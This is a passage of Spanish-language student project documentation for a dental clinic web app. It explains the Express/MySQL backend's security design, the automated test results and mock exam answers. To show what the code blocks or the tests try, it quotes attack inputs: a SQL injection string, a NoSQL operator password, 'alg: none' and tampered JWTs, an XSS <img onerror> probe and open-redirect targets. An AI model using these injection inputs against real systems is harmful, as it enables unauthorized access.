                            errorHandler      { status, message, fields, code }
```

Cada paso solo deja pasar lo que le corresponde. El controlador nunca pregunta "¿hay sesión?":
si llegó hasta él, `verifyToken` ya lo comprobó.

**Express 5 y las funciones `async`.** En Express 4, si un controlador `async` lanzaba un error, la
promesa rechazada se perdía y la petición quedaba colgada. Había que envolver cada función en
`try/catch` o en un `asyncHandler`. **Express 5** atrapa esas promesas y las manda al manejador de
errores. Por eso los controladores simplemente hacen `throw new ApiError(409, …)`.

### 16.3 Configuración: `.env` y el pool de conexiones

**Variables de entorno.** La contraseña de la base y el secreto del JWT no van en el código. Cambian
en cada equipo, y quien lea el repositorio no debe conocerlos. Por eso viven en `backend/.env`, que
está en `.gitignore`. Lo que sí se sube es `.env.example`, la plantilla sin secretos.

`config/env.js` valida al arrancar. Si falta `JWT_SECRET` o tiene menos de 32 caracteres, el
servidor **no arranca** y dice cómo generar uno. Es mejor un error claro en el primer segundo que
un login que falla después.

**Pool de conexiones.** Abrir una conexión a MySQL cuesta (TCP y autenticación). El pool mantiene
hasta 10 abiertas y las presta: `pool.query()` toma una libre, ejecuta y la devuelve. Si llegan 50
peticiones a la vez, esperan en cola en vez de abrir 50 conexiones.

Tres opciones del pool que importan:

| Opción | Por qué |
|---|---|
| `dateStrings: true` | Sin ella, `fecha_nacimiento` llega como objeto `Date` en UTC y, en Colombia (UTC−5), `1990-02-14` se puede mostrar como 13 de febrero. Con ella llega el texto `'1990-02-14'`, igual que en el mock |
| `decimalNumbers: true` | Los `DECIMAL` (precios, montos) llegan como número y no como texto |
| `charset: 'UTF8MB4_GENERAL_CI'` | Tildes y ñ, con la misma intercalación de las tablas |

**Consultas parametrizadas, siempre.** `pool.query('… WHERE email = ?', [correo])`: el valor viaja
**aparte** del SQL. Si alguien escribe `' OR '1'='1` como correo, eso es solo un texto que no coincide
con nadie. Nunca cambia la consulta. Hay una prueba que lo intenta.

**Transacciones.** `withTransaction(async (conn) => …)` hace `BEGIN`, ejecuta y hace `COMMIT`. Si
algo falla, hace `ROLLBACK`. Registrar un paciente son **tres** `INSERT`: el paciente, su historia
clínica y la auditoría. O se guardan los tres o ninguno. Un paciente sin historia sería un dato a
medias.

### 16.4 Errores: un solo lugar y un solo formato

Todas las respuestas de error tienen la misma forma, la del `ApiError` del frontend:

```json
{ "status": 409, "message": "Hay datos que ya están registrados.",
  "fields": { "numero_documento": "Ya existe un paciente con ese número de documento." },
  "code": "DUPLICATE" }
```

`http.js` toma `fields` y lo pasa a `ApiError`. El formulario muestra el mensaje **junto al campo**,
igual que con el mock. La prueba E2E lo comprueba con un documento repetido.

`middlewares/error-handler.js` traduce los errores de las librerías:

| Error original | Respuesta |
|---|---|
| `ApiError` lanzado por un controlador | Su propio status (400, 401, 403, 404, 409…) |
| JSON mal formado (`entity.parse.failed`) | 400 `BAD_JSON` |
| `ER_DUP_ENTRY` (llave `UNIQUE`) | 409 `DUPLICATE` |
| `CHECK` incumplido: 3819 en MySQL 8, 4025 en MariaDB | 400 `CONSTRAINT` |
| Base apagada (`ECONNREFUSED`, credenciales malas…) | 503 `DB_UNAVAILABLE` |
| Cualquier otro error | 500 `INTERNAL` con un mensaje genérico |

**Regla de oro:** al usuario se le dice **qué pasó** con palabras útiles. Nunca el detalle técnico:
ni el SQL, ni el *stack*, ni rutas del servidor, porque son pistas gratis para un atacante (OWASP
A05). Ese detalle se escribe en la consola del servidor, para quien lo mantiene. Por la misma razón
`app.js` apaga el encabezado `X-Powered-By: Express`.

### 16.5 Autenticación: bcrypt + JWT

**Login (`POST /api/auth/login`).**

1. Valida que `email` y `password` sean texto (400 si no). Así se bloquea un truco conocido: enviar
   `{"password": {"$ne": ""}}` en vez de una cadena.
2. Busca la cuenta por correo, sin distinguir mayúsculas ni espacios.
3. **Siempre** ejecuta `bcrypt.compare()`. Si el correo no existe, compara contra un *hash de
   relleno*. ¿Por qué? Sin él, "correo inexistente" respondería en 2 ms y "contraseña mala" en 80
   ms (lo que tarda bcrypt). Midiendo el tiempo se sabría qué correos están registrados
   (**enumeración**). La prueba mide los dos casos: 84 ms y 78 ms.
4. El mensaje es el mismo en los dos casos (RF-ACC-02), y el intento queda en `log_auditoria` como
   `LOGIN_FALLIDO`.
5. Si la contraseña es correcta pero la cuenta o el rol están inactivos: 403. Solo se le dice a
   quien demostró conocer la contraseña.
6. Firma el JWT, registra `LOGIN` y responde `{ token, user }`. El `user` es **idéntico** al que
   armaba el mock. Hay una prueba de contrato que los compara rol por rol.

**¿Qué es un JWT?** Tres partes en base64 separadas por puntos: `encabezado.contenido.firma`.

```
{"alg":"HS256","typ":"JWT"} . {"rol":"ADMINISTRADOR","sub":"1","iat":…,"exp":…} . firma
```

- El contenido se puede **leer** (base64 no es cifrado). Por eso no lleva nada secreto, solo quién
  es (`sub`) y su rol.
- Lo que no se puede es **modificarlo**. La firma es un HMAC-SHA256 del encabezado y el contenido
  con `JWT_SECRET`, que solo conoce el servidor. Si alguien cambia `"sub":"1"` por `"sub":"2"`, la
  firma deja de coincidir y la API responde 401. Hay una prueba que lo hace.
- `exp` hace que venza a las 8 horas, la misma duración de la sesión del frontend.
- `verifyToken` solo acepta `HS256`. Así cierra el ataque clásico de enviar un token con
  `"alg": "none"` (sin firma).

**`verifyToken` consulta la base en cada petición.** Un JWT es válido hasta que vence, y el servidor
no guarda una lista de tokens. Si el administrador inactiva una cuenta, ¿cómo se le quita el
acceso? `verifyToken` busca al usuario en cada petición y comprueba que él y su rol sigan activos.
Si no, responde 401 de inmediato. De esa misma consulta salen los **permisos del rol** leídos de
`rol_permiso`, la matriz corregida en B-03. Cuesta una consulta por petición, que con índices por
llave primaria es despreciable.

**Cerrar sesión.** `POST /api/auth/logout` deja el registro en la auditoría y el frontend borra su
copia del token. El token en sí sigue siendo válido hasta que vence: es la limitación conocida de
los JWT. Para revocarlo de verdad se necesitaría una lista negra en la base, una mejora anotada
para después.

### 16.6 Pacientes

**`GET /api/pacientes?q=`: qué ve cada rol.** La decisión sale del token y de los permisos en la base:

| Rol | Ve |
|---|---|
| PACIENTE | Solo su propio registro (`WHERE id_paciente = ?` con el id **del token**, no de la URL) |
| Con `GESTIONAR_PACIENTES` (administrador, recepción) o `VER_HISTORIA_CLINICA` (odontólogo) | Todos |
| Cualquier otro | 403 |

La búsqueda usa `LIKE` sobre nombres, apellidos, documento y correo. Detalles que se cuidaron:

- **Sin tildes ni mayúsculas.** La intercalación `utf8mb4_general_ci` de la tabla hace que
  `'londono'` encuentre "Londoño". Es el mismo comportamiento que tenía el mock con
  `normalizeText`.
- **`%` y `_` se escapan.** En `LIKE` son comodines: buscar "%" traería a todos. Se convierten en
  texto literal.
- **`?q=a&q=b`** llega como lista y no como texto. Se ignora en vez de romper el servidor.

**`POST /api/pacientes`: el servidor no confía en el formulario.**

1. **Lista blanca (`pick`)**: solo se copian las 12 columnas permitidas. Si el cliente envía
   `id_paciente`, `id_usuario` o `fecha_registro`, se ignoran. Así se evita la **asignación
   masiva** (OWASP A08).
2. **Validación**: las mismas reglas y mensajes de `frontend/js/core/validators.js`. Celular de 10
   dígitos que empiece en 3, documento de 6 a 12 dígitos, fecha real y no futura (rechaza el 30 de
   febrero), y tipo de documento y género con la **misma lista** de los `CHECK` de la base. Se
   devuelven **todos** los errores a la vez, uno por campo.
3. **DIVIPOLA**: el departamento debe existir y el municipio debe pertenecer a **ese** departamento.
   "Cali" en Antioquia se rechaza, y no hay municipio sin departamento. El backend tiene su copia
   de la lista (`src/data/divipola.js`) porque se despliega por separado del frontend. Una prueba
   comprueba que ambas copias son idénticas.
4. **Duplicados → 409**: documento o correo ya registrados, con el campo exacto en `fields`.
5. **Condición de carrera**: dos recepcionistas guardan el mismo documento en el mismo instante.
   Los dos pasan la consulta del paso 4, pero la llave `UNIQUE` de la base solo deja entrar a uno.
   El otro recibe `ER_DUP_ENTRY`, y el controlador lo convierte en el **mismo** 409. La prueba envía
   las dos peticiones a la vez: una da 201, la otra 409, y en la base queda una sola fila. Es la
   defensa en profundidad de §15.3 funcionando.
6. **Transacción**: paciente, historia clínica y auditoría. Responde **201 Created** con el
   encabezado `Location: /api/pacientes/51`.

### 16.7 Frontend ↔ backend: el interruptor `USE_MOCK`

```
 páginas ─► pacientesService.list() ─┬─ USE_MOCK = true  ─► mock (localStorage)
                                     └─ USE_MOCK = false ─► http.js ─► fetch ─► API ─► MySQL
```

Desde la fase A5 cada servicio tiene dos implementaciones con la **misma interfaz**: `mock` y
`remote`. Por eso la integración no tocó ninguna página. Solo se ajustaron dos detalles en la capa
de servicios:

- `http.js` lee `fields` (antes esperaba `errors`), el nombre que usa la API.
- El mock aceptaba `RC` como tipo de documento, y la base no. Ahora la lista es igual en las tres
  capas.

**CORS.** El frontend corre en un origen (`http://127.0.0.1:5500`, Live Server) y la API en otro
(`http://localhost:3000`). El navegador bloquea las respuestas entre orígenes salvo que el servidor
las permita. Como `http.js` envía `Authorization`, el navegador hace primero una petición
**preflight** (`OPTIONS`). `app.js` permite solo los orígenes de `CORS_ORIGIN`. Nunca usa `*`,
porque entonces cualquier página de internet podría llamar a la API desde el navegador de un
usuario.

**Cómo se probó la integración sin editar `config.js`.** `node tests/e2e/server.mjs --api` sirve el
frontend y entrega `config.js` con `USE_MOCK = false`. Son exactamente los bytes que habría si se
editara el archivo, pero el repositorio sigue en modo mock. La prueba `tests/e2e/backend.test.mjs`
abre Edge y recorre:

1. Login con contraseña mala: el mensaje del 401 de la API aparece en el formulario.
2. Login correcto: la sesión guarda un JWT real y vuelve a la página pedida (`?next`).
3. La tabla carga los 40 pacientes de MySQL, y la búsqueda funciona.
4. Nuevo paciente con departamento y municipio:
   - documento repetido: el 409 aparece **junto al campo**;
   - documento nuevo: "Paciente registrado", y en MySQL quedan la ubicación y la historia clínica.
5. Token alterado en `localStorage`: la API responde 401, `http.js` cierra la sesión y lleva al
   login.
6. Cerrar sesión: `LOGOUT` queda en la auditoría.

### 16.8 Cómo ejecutarlo

```bash
# 1. Base de datos: XAMPP encendido y la v2 importada (una sola vez)
mysql -u root < database/dentalcare_bd_v2.sql

# 2. Backend (terminal 1)
cd backend
npm install                      # solo la primera vez
cp .env.example .env             # y poner un JWT_SECRET (el comando para generarlo está en el archivo)
npm start                        # → API DentalCare en http://localhost:3000/api

# 3. Frontend con la API: en frontend/js/core/config.js poner USE_MOCK = false
#    y abrir frontend/index.html con Live Server (puerto 5500, ya permitido en CORS_ORIGIN)
```

Al arrancar, el servidor dice a qué base se conectó o por qué no pudo ("¿Está encendido XAMPP?").
Si la base se cae, sigue respondiendo con 503 `DB_UNAVAILABLE`, así que el frontend muestra un
mensaje en vez de "sin conexión". `GET /api/health` lo confirma.

### 16.9 Lo que queda para la fase D

| Pendiente | Nota |
|---|---|
| Módulos citas, historias, odontograma, servicios, especialistas, ventas, novedades | Con `USE_MOCK = false`, esas pantallas responden 404 por ahora |
| `PUT`/`DELETE` de pacientes, `GET /pacientes/:id` | El servicio del frontend ya los llama así |
| Recuperación de contraseña (`/auth/forgot-password`, `/auth/reset-password`) | La tabla `password_reset` ya existe (B-08) |
| Límite de intentos de login (*rate limiting*) | Hoy cada intento cuesta ~80 ms de bcrypt, pero no hay bloqueo |
| Lista negra de tokens al cerrar sesión | Ver §16.5 |
| HTTPS | En producción, el token viaja en cada petición y debe ir cifrado |

---

## 17. Cómo se verificó la calidad

Se escribieron **pruebas automatizadas** que abren el styleguide en un navegador real (Edge sin
interfaz), simulan clics, teclado y envío de formularios, y comprueban el resultado:

| Suite | Pruebas | Resultado |
|---|---|---|
| Moléculas (A2) | 74 | 74 ✅ |
| Organismos (A3) | 73 | 73 ✅ |
| Templates (A4) | 56 | 56 ✅ |
| Lógica de agenda y datos mock (Node) — `tests/agenda.test.mjs` | 18 | 18 ✅ |
| Desborde horizontal en móvil (375 px), incluidos los 3 templates | — | sin desborde ✅ |
| Capa de servicios (A5 + `ocupacion` de A6, Node) — `tests/services.test.mjs` | 67 | 67 ✅ |
| Storage, sesión y guard (A5, Node) — `tests/guard.test.mjs` | 30 | 30 ✅ |
| Prueba de humo A5 en Edge real (1366 px y 375 px): login con Web Crypto, `localStorage`, inicio del administrador | 11 | 11 ✅ |
| **Recorrido A6** en Edge real — `tests/e2e/recorrido.test.mjs`: las 25 pantallas con los 4 roles, un solo `<h1>`, sin errores de carga, sin desborde, guards y redirecciones | 59 | 59 ✅ a 1366 px y a 375 px |
| **Flujos A6** en Edge real — `tests/e2e/flujos.test.mjs`: registrar paciente, pedir cita, cancelar, confirmar, registrar consulta, RN-01 en solo lectura, abono, cerrar sesión | 17 | 17 ✅ a 1366 px y a 375 px |
| **APIs externas (Node)** — `tests/apis-externas.test.mjs`: `fetch` falso (éxito, 500, sin red, tiempo límite, JSON inválido, inyección SoQL, caché, TRM de respaldo, sin TRM) | 37 | 37 ✅ |
| **APIs externas reales** — `tests/apis-externas.test.mjs --live`: datos.gov.co (DIVIPOLA y TRM) y ExchangeRate-API responden con el formato esperado | 4 | 4 ✅ (2026-10-19) |
| **APIs externas E2E** en Edge real — `tests/e2e/apis.test.mjs`: departamento → municipio, guardar y editar, tarjeta TRM y conversor; luego con las APIs **bloqueadas** (respaldo local y aviso de TRM) | 22 | 22 ✅ a 1366 px y a 375 px |
| **Base de datos v2 (fase B)** — `tests/db/pruebas_bd_v2.sql`: datos corregidos, 18 escrituras inválidas rechazadas por la base y 8 válidas aceptadas | 38 | 38 ✅ en MariaDB 10.4 y en MySQL 8.0 |
| **Equivalencia v2 = v1 + migración**: estructura y `CHECKSUM … EXTENDED` de las 20 tablas | 20 tablas | idénticas ✅ (2 rondas, 2 motores) |
| **API del backend (fase C)** — `tests/backend/api.test.mjs`: errores, CORS, login (tiempo constante, auditoría, JWT), ataques al token, cuenta y rol inactivos, contrato con el mock, búsqueda, permisos por rol, validación, DIVIPOLA, 409, carrera de duplicados, base caída → 503 | 79 | 79 ✅ en MariaDB 10.4 y en MySQL 8.0 |
| **Integración frontend ↔ backend** en Edge real — `tests/e2e/backend.test.mjs` con `USE_MOCK = false`: login, listado, registro con 409 junto al campo, token alterado → login, cerrar sesión | 19 | 19 ✅ a 1366 px y a 375 px |
| Regresión del modo mock después de la fase C (`services`, `guard`, `agenda`, `apis-externas`, `recorrido`, `flujos`) | 67 + 30 + 18 + 37 + 59 + 17 | todas ✅ |

Al terminar A4 se **volvieron a correr** las suites de A2 y A3 (pruebas de regresión): siguen en
74/74 y 73/73, así que lo nuevo no dañó nada de lo anterior.

**Cómo correr las pruebas de Node** (desde la raíz del proyecto, sin instalar nada):

```bash
node tests/agenda.test.mjs
node tests/services.test.mjs
node tests/guard.test.mjs
node tests/apis-externas.test.mjs          # sin internet (fetch falso)
node tests/apis-externas.test.mjs --live   # además consulta las APIs reales
```

**Pruebas de la base de datos** (necesitan MySQL o MariaDB encendido, con la v2 importada):

```bash
mysql -u root < database/dentalcare_bd_v2.sql
mysql -u root dentalcare_bd < tests/db/pruebas_bd_v2.sql   # la última línea debe decir fallidas = 0
```

**Pruebas del backend** (base v2 importada, `cd backend && npm install` y `backend/.env` creado). La
prueba deja la base como estaba: borra lo que crea y restaura lo que cambia.

```bash
node tests/backend/api.test.mjs                 # usa la base de backend/.env
DB_PORT=3307 node tests/backend/api.test.mjs    # otra base: las variables del sistema ganan al .env

# Integración en navegador (tres terminales):
cd backend && npm start                         # 1. API en :3000
node tests/e2e/server.mjs --api                 # 2. frontend con USE_MOCK = false en :5600
node tests/e2e/backend.test.mjs 1366            # 3. la prueba (375 para móvil)
```

**Cómo correr las pruebas en navegador (A6)** — necesitan Microsoft Edge (o Chrome con
`BROWSER_PATH`) y el servidor de pruebas abierto en otra terminal:

```bash
node tests/e2e/server.mjs                 # terminal 1: sirve frontend/ en http://127.0.0.1:5600
node tests/e2e/recorrido.test.mjs 1366    # terminal 2 (375 para móvil)
node tests/e2e/flujos.test.mjs 1366
node tests/e2e/apis.test.mjs 1366         # APIs externas: necesita internet
```

Usan el **protocolo DevTools (CDP)** directamente desde Node, sin librerías: abren el navegador sin
interfaz, escriben en los formularios, hacen clic y leen el resultado. Además recogen **todo error de
JavaScript** que aparezca en la consola: una página que "se ve bien" pero lanza errores no pasa.

**Qué cubren las pruebas de A5:**
- **Autenticación:** mismo mensaje para correo inexistente y contraseña mala; ninguna contraseña
  en texto plano en la base; la sesión vence a las 8 h; recuperación de contraseña con enlace de un
  solo uso.
- **Autorización:** 401 sin sesión; 403 cuando recepción edita una historia (RN-01), cuando un
  odontólogo no asignado la edita, cuando el paciente pide datos de otro paciente.
- **Reglas de negocio:** RN-02 (fuera de horario → 422), franja ocupada → 409, transiciones de
  estado inválidas → 409, abono mayor al saldo → 422 sin cambiar nada (rollback).
- **Persistencia:** lo creado queda guardado, las respuestas son copias, `resetDemoData` vuelve al seed.
- **Storage:** respaldo en memoria si `localStorage` está bloqueado, JSON corrupto no rompe la app.
- **Sesión manipulada:** un rol inventado o una sesión con forma inválida se descartan.
- **Guard:** login con `next`, 403 con `from`, logout y vencimiento detectados mientras la página
  está abierta, y 9 intentos de redirección abierta bloqueados por `safeNext` (otro dominio,
  `//dominio`, `javascript:`, rutas fuera de la app, carpeta de otro rol…).

**Errores reales que las pruebas encontraron (y se corrigieron):**
1. `PasswordField` no pasaba el atributo `name` al input → el login no habría podido leer la
   contraseña.
2. `ConfirmDialog` dependía de un evento asíncrono → el modal podía quedarse bloqueando la página.
3. `Toast` dependía de `requestAnimationFrame` → podía quedar invisible (§8.3).
4. Las pestañas ensanchaban la página en móvil → se agregó `min-width: 0`.
5. Los ids de las secciones del Sidebar llevaban espacios ("Mi portal"), lo que rompía
   `aria-labelledby` → se generan con índices.
6. El botón "Agendar cita" volvía a decir "Siguiente" tras la carga → se creó `setButtonLabel()`.

**Hallazgos de A4 (revisión visual de capturas a 1366 px y 375 px):**
7. El logo aparecía **dos veces** en escritorio (sidebar y topbar) → el template oculta el de la
   topbar desde 1024 px (en móvil sí se muestra, porque el sidebar está escondido).
8. En móvil el resumen de la ficha quedaba en una sola columna larga → mínimo de 130 px por
   indicador; ahora caben dos por fila.

**Hallazgos de A5:**
9. La página de inicio (`home.js`) y el mensaje de error de carga (`loadInto`) usaban las clases
   `.item-list` y `.page-error`, que **no existían** en el CSS: la lista de próximas citas salía
   sin estilo. Se agregaron a `css/templates/app-shell.css` como superficies compartidas para A6.
10. Las suites de pruebas de servicios y agenda estaban en una carpeta temporal fuera del
    repositorio (se habrían perdido). Se movieron a `tests/` y se agregó la de `guard.js`, que no
    tenía pruebas.

**Hallazgos de A6:**
11. **Promesa rechazada sin manejar:** después de cancelar una cita, la lista se recarga. Si la
    sesión vencía justo en ese momento, el 401 de la recarga quedaba como error sin manejar en la
    consola. Ahora la recarga pasa por `runAction()` y se muestra un aviso. Lo encontró la prueba de
    flujos, que cierra sesión muy rápido después de cancelar.
12. **El wizard mentía sobre el estado:** decía "estado Programada" aunque el servicio guardara la
    cita del paciente como *pendiente de confirmación*. Ahora muestra la cita que devuelve el servicio.
13. **El odontograma no decía qué se borró:** el evento `remove` no traía el hallazgo, así que no se
    podía eliminar en el servicio.
14. **Riesgo de página abierta:** un HTML sin `data-role` habría dejado entrar a cualquier rol.
    `createAppPage()` ahora lo impide (§13.1).
15. Faltaba el **favicon** (error 404 en la consola de todas las páginas) → `favicon.svg`.

**Hallazgos de la integración de APIs externas:**
16. **El conjunto de datos de los tutoriales ya no existe.** El identificador de municipios que
    suele citarse (`xdk5-pm3f`) responde `dataset.missing`. Se descubrió **probando el endpoint
    antes de programar** y se cambió a los conjuntos oficiales DIVIPOLA del DANE.
17. **La API devuelve los nombres en MAYÚSCULAS** ("SAN JOSÉ DE CÚCUTA"). Se normalizan con
    `nombrePropio()`, cuidando las siglas ("Bogotá, D.C.").
18. **`replaceChildren` no es `h()`.** Al pintar la tarjeta TRM, una condición `false` dentro de
    `replaceChildren(...)` se habría mostrado como el texto "false" (`h()` sí ignora `false`). Se
    filtran los valores vacíos antes de pintar.
19. **La prueba suponía datos equivocados.** Dos pruebas fallaron la primera vez: el nombre oficial
    es "Santiago de Cali" (no "Cali") y el código 99 **sí existe** (Vichada). El código estaba
    bien; se corrigió la prueba. Las pruebas E2E con APIs bloqueadas también tuvieron que aceptar
    los errores de red **esperados** en la consola (`ignoreErrors` en el arnés).

**Hallazgos de la fase B (base de datos):**
20. **El script original no se importaba limpio.** Importar `dentalcare_bd.sql` completo en un
    MariaDB vacío dio 28 errores, todos en las prácticas CRUD del final. Es fácil no notarlo:
    el primer error está en la línea 1271, cuando las tablas y los datos ya se crearon, así que la
    base parece estar bien (B-00).
21. **La prueba podía dar falsos positivos.** En la primera versión de `debe_fallar`, *cualquier*
    error contaba como acierto, incluso un error de sintaxis o una columna mal escrita en la propia
    prueba. Se descubrió **saboteando la prueba a propósito**. Ahora los errores 1064 (sintaxis),
    1054 (columna) y 1146 (tabla) cuentan como "prueba mal escrita".
22. **MySQL y MariaDB no se comportan igual.** La prueba funcionaba en MariaDB y en MySQL 8 daba
    19 fallas. En MySQL, cualquier sentencia dentro de un *handler* (incluso un `IF`) vacía el
    área de diagnóstico, así que `GET DIAGNOSTICS` tiene que ir primero. Por eso se prueba en los
    dos motores.
23. **`mysqldump` exportaba las columnas generadas.** Con `--complete-insert`, el `INSERT` de
    `venta` incluía `saldo_pendiente` y `estado_venta`. MariaDB lo acepta con una advertencia y
    MySQL 8 lo rechaza. El script que arma la v2 quita esas dos columnas del `INSERT`.
24. **Una restricción más estricta que el formulario.** El primer `CHECK` de tipo de documento
    aceptaba `RC`, que el formulario no ofrece. Se alineó la lista con el frontend.
25. **Una tabla de resultados que se borraba sola.** La tabla temporal de resultados de las pruebas
    era InnoDB, así que el `ROLLBACK` final también habría borrado los resultados. Se cambió a
    `ENGINE=MEMORY`, que no participa en transacciones. Además, una comparación de checksums dio una
    diferencia en `venta` que no se repitió: se compararon las 40 filas una a una (idénticas) y se
    pasó a `CHECKSUM … EXTENDED`, que lee los datos de verdad. Dos rondas seguidas dieron idéntico.

**Hallazgos de la fase C (backend):**
26. **El frontend y el backend no se llamaban igual.** `http.js` esperaba los errores por campo en
    `errors` y la API los envía en `fields`, el nombre de `ApiError`. Sin el ajuste, un 409 de la API
    habría salido como aviso general y no junto al campo. La prueba E2E del documento repetido lo
    comprueba.
27. **El mock era más permisivo que la base.** El mock aceptaba `RC` como tipo de documento, y el
    `CHECK` de la base no (hallazgo 24). Con la API real, ese paciente habría dado error. Se quitó
    del mock: la misma lista en las tres capas.
28. **Una ruta con espacios.** La prueba de "base caída" arrancaba `server.js` en otro proceso con
    `URL.pathname`, que deja la carpeta "CURSOS SENA" como `CURSOS%20SENA`. Node no encontraba el
    archivo. Se cambió a `fileURLToPath()`, que decodifica la ruta. Lección: probar en una carpeta
    con espacios, como la de muchos estudiantes.
29. **Dos pruebas E2E mal planteadas.** Una buscaba "Galvis" en la tabla, pero la tabla muestra 10
    por página y Galvis está en la segunda. La otra buscaba la petición de login en
    `performance` de la página de pacientes, cuando el login ocurrió en la página anterior. El
    código estaba bien. Ahora se comprueba "de 40 registros" y solo la petición de esta página.

**Las pruebas también se equivocan:** la prueba del *skip link* falló la primera vez porque leía
el estilo **durante** la transición de 120 ms (el enlace todavía se estaba moviendo). El código
estaba bien; se corrigió la prueba para esperar a que la transición terminara. En A5 pasó algo
parecido: una prueba del guard falló porque los guards de casos anteriores seguían "vigilando" la
sesión y también redirigían; el código estaba bien y se ajustó la prueba. Y la prueba en Edge sin
interfaz se quedaba quieta en el login: el modo de "tiempo virtual" del navegador no espera a Web
Crypto (que calcula el hash fuera del hilo principal), así que se cambió a esperar en tiempo real.
En A6, las pruebas de navegador fallaban **a veces** en pasos distintos ("no encontré el botón").
La causa era la prueba: tras pedir una página nueva esperaba 400 ms fijos y, si el navegador aún
mostraba la anterior, buscaba el botón en la página equivocada. Se corrigió esperando a que la URL
sea la nueva, y se repitió la suite varias veces seguidas para confirmar que ya es estable. Una
prueba que falla "a veces" no se ignora: o hay un error en el código, o la prueba no es confiable.

**Frase para la sustentación:** *"No asumí que funcionaba: lo probé, y las pruebas encontraron
errores que un usuario habría encontrado primero."*

---

## 18. Simulacro de preguntas del docente

**P1. ¿Qué es Atomic Design y por qué lo usaron?**
R: Una metodología que divide la interfaz en átomos, moléculas, organismos, templates y páginas. La
usamos porque garantiza **consistencia** (un mismo botón en todo el sistema), **reutilización**
(`FormField` sirve en el login, el registro de pacientes y los modales) y **mantenibilidad** (un
cambio en un átomo se propaga). Además, la regla de que las dependencias solo van hacia abajo evita
el código espagueti.

**P2. ¿Cuál es la diferencia entre una molécula y un organismo? Dé un ejemplo.**
R: La molécula tiene una sola función y es pequeña: `SearchBar` solo busca. El organismo es una
sección completa con varias responsabilidades: `DataTable` combina búsqueda, filtros, orden, tabla,
acciones y paginación.

**P3. ¿Por qué no usaron React o Angular?**
R: Era requisito del proyecto, y además nos da cero dependencias, mejor rendimiento y comprensión
real del DOM. Aplicamos los mismos principios (componentes como funciones con props, composición)
con APIs nativas. El costo es que la actualización de la vista es manual (`render()`), y lo
asumimos de forma consciente.

**P4. ¿Qué es XSS y cómo lo previenen?**
R: Es la inyección de código malicioso que se ejecuta en el navegador de otro usuario. Lo prevenimos
construyendo el DOM con `h()`, que convierte todo texto en `createTextNode`: nunca se interpreta
como HTML. Hay una prueba automatizada que intenta el ataque con `<img onerror>` y verifica que no
se ejecuta.

**P5. Entonces, ¿`innerHTML` está prohibido?**
R: No: está prohibido con **datos que no controlamos**. Lo usamos solo en `icon.js` con trazos SVG
constantes escritos en el código. La regla es sobre el origen del dato.

**P6. Si validan en el frontend, ¿el backend también debe validar?**
R: Sí, siempre. La validación del cliente es para la **experiencia** del usuario. Cualquiera puede
saltársela con las herramientas del navegador o enviando peticiones directas a la API. La
validación del servidor es la que protege los datos.

**P7. ¿Qué es `aria-live` y dónde lo usan?**
R: Marca una región cuyos cambios el lector de pantalla anuncia sin mover el foco. Lo usamos en los
mensajes de error de los campos, en el contador de resultados de búsqueda y en las notificaciones.
`polite` espera a que el lector termine; `role="alert"` interrumpe (lo reservamos para errores).

**P8. ¿Por qué `aria-disabled` y no `disabled` en las franjas ocupadas?**
R: Un botón `disabled` sale del orden de tabulación: un usuario de teclado ni siquiera sabría que
la franja existe. Con `aria-disabled` puede llegar y escuchar "08:00, Ocupado", pero no
seleccionarla.

**P9. Explique el debounce.**
R: Es esperar a que un evento repetitivo se detenga antes de actuar. En la búsqueda, cada tecla
reinicia un temporizador de 300 ms; la búsqueda solo ocurre cuando el usuario deja de escribir.
Reduce el trabajo y, con backend, las consultas a la base de datos.

**P10. ¿Por qué `confirmDialog` devuelve una promesa?**
R: Porque la decisión del usuario llega en el futuro. Con `await` el código queda lineal
(`if (await confirmDialog(...))`), igual de simple que `confirm()`, pero accesible y con diseño
propio. La promesa se resuelve exactamente una vez gracias a una función idempotente.

**P11. ¿Qué es un reflow y por qué lo usaron en vez de `requestAnimationFrame`?**
R: El reflow es cuando el navegador recalcula el tamaño y la posición de los elementos. Leer
`offsetHeight` lo fuerza de forma síncrona, así la transición de entrada del toast tiene un estado
inicial. `requestAnimationFrame` se pausa en pestañas en segundo plano y el toast quedaba invisible:
lo descubrimos con las pruebas.

**P12. ¿Cómo garantizan la regla RN-02?**
R: En el frontend, `getDaySlots()` solo ofrece franjas dentro del horario del odontólogo y libres,
y el wizard revalida antes de guardar. En el backend (fase C) se validará de nuevo dentro de una
transacción, porque el servidor es la fuente de verdad.

**P13. ¿Qué pasa si no hay disponibilidad? (RF-CIT-03)**
R: El wizard muestra una alerta con el motivo ("no atiende ese día" o "no tiene franjas libres") y
propone las próximas tres fechas con el mismo odontólogo y otros odontólogos con cupo ese día. Un
clic en una alternativa la selecciona.

**P14. ¿Cómo funciona la navegación según el rol?**
R: `core/navigation.js` define el menú de cada rol de la tabla `rol` (ADMINISTRADOR, RECEPCIONISTA,
ESPECIALISTA, PACIENTE). El `Sidebar` recibe el rol y construye solo esos enlaces. Ocultar un menú
**no es** seguridad: en la fase A5 se agregaron el *guard* de páginas y la autorización por
permisos en cada servicio (§12.6 y §12.7); en la fase C la API lo repetirá en el servidor.

**P15. ¿Qué son los design tokens?**
R: Variables CSS con nombre para colores, espacios y tipografía. Tienen dos capas: valores
(`--color-primary-700`) y alias semánticos (`--color-brand`). Los componentes solo usan alias, así
cambiar la marca es editar un archivo.

**P16. ¿Cómo hicieron las gráficas sin librerías?**
R: Con SVG generado por JavaScript (`createElementNS`). Calculamos una escala "bonita" (pasos de
1, 2, 5 × 10ⁿ), dibujamos barras con la punta redondeada y la base recta, y redibujamos con
`ResizeObserver` cuando cambia el ancho. Cada barra es enfocable con tooltip, y hay una vista de
tabla para quien no pueda ver la gráfica.

**P17. ¿Por qué el odontograma usa rojo y azul si los badges usan otros colores?**
R: Es la convención clínica en odontogramas (rojo = por tratar, azul = realizado), y los
odontólogos la reconocen de inmediato. Dentro del odontograma, el resumen y la leyenda usan
exactamente los mismos colores, para que un estado se vea igual en todo el componente.

**P18. ¿Qué es una container query y por qué la usaron?**
R: Es una media query que responde al ancho del **contenedor** y no al de la ventana. El
odontograma decide si el panel va al lado o debajo según el espacio que realmente tiene, lo que lo
hace reutilizable en cualquier página o modal.

**P19. ¿Cómo prueban que todo funciona?**
R: Con 468 pruebas automatizadas en un navegador real y en Node: interacciones, teclado, ARIA,
validaciones, reglas de negocio, permisos, sesión, diseño responsive y, desde A6, recorridos
completos de usuario por las 25 pantallas. Encontraron errores reales
que se corrigieron (§17). Las de Node están en `tests/` y cualquiera las puede repetir con
`node tests/<suite>.test.mjs`. Desde la fase B hay además 38 pruebas de la base de datos
